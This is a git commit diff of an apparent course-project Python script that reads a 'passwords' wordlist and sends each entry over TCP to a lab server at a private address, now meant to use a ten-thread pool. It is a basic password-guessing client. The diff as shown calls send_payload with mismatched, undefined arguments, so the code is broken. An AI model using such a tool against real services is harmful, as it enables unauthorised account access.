bda39236a64377dc16649b34335eb8aaf41505f1
Brandon Kamaka <Brandon.Kamaka@afit.edu>
2019-01-14 22:03:40 -0500

    Implemented basic multithreading to enable parallel mapping of sockets to payloads.

--- Project1-4.py
+++ Project1-4.py
@@ -1,40 +1,32 @@
-
-from socket import *
+import itertools
 import time
+
+from multiprocessing.dummy import Pool as Threadpool
 from os.path import abspath, exists
+from socket import *
 
 
-# def send_by_byte(output: str, s: socket):
-#     for i in range(0, len(output)):
-#         s.send(output[i].encode())
-#     #s.send('\r\n'.encode())
-#
-#     return
+MAX_SOCKETS = 10
+SERVER_NAME = '10.12.1.244'
+SERVER_PORT = 80
+
 
 def main():
-    server_name = '10.12.1.244'
-    server_port = 80
-    client_socket = create_socket(server_name, server_port)
+    pool = Threadpool(MAX_SOCKETS)
 
     f_path = abspath("passwords")
-
-    sentinel = 0
     if exists(f_path):
         with open("passwords") as f:
-            for l in f:
-                sentinel += 1
-                attempt = l.strip()
+            # Yeah, this is a weird one.  zip_longest takes an unpacked list (*list_var).
+            # We want n copies of a single (list_var * n) list because we're going to call n copies of the same iter.
+            # In order to serialize n sockets.
+            for words in itertools.zip_longest(*[f]*MAX_SOCKETS):
 
-                print(attempt)
+                attempts = []
+                for w in words:
+                    attempts.append(w.strip())
 
-                client_socket.send(attempt.encode())
-                time.sleep(.01)
-
-                if sentinel >= 3000:
-                    client_socket.close()
-                    client_socket = create_socket(server_name, server_port)
-                    sentinel = 0
-
+                send_payload(server_name, server_port)
     else:
         print("failed to find path")
 
@@ -44,14 +36,25 @@ def main():
     print("Service stopped!")
 
 
-def create_socket(serverName, serverPort):
+def send_payload(payload):
     # Create a TCP client socket
     # (AF_INET is used for IPv4 protocols)
     # (SOCK_STREAM is used for TCP)
     client_socket = socket(AF_INET, SOCK_STREAM)
-    client_socket.connect((serverName, serverPort))
+    client_socket.connect((SERVER_NAME, SERVER_PORT))
 
-    return client_socket
+    client_socket.send(payload.encode())
+    client_socket.close()
 
 
-main()
+
+# def send_by_byte(output: str, s: socket):
+#     for i in range(0, len(output)):
+#         s.send(output[i].encode())
+#     #s.send('\r\n'.encode())
+#
+#     return
+
+
+if __name__ == '__main__':
+    main()
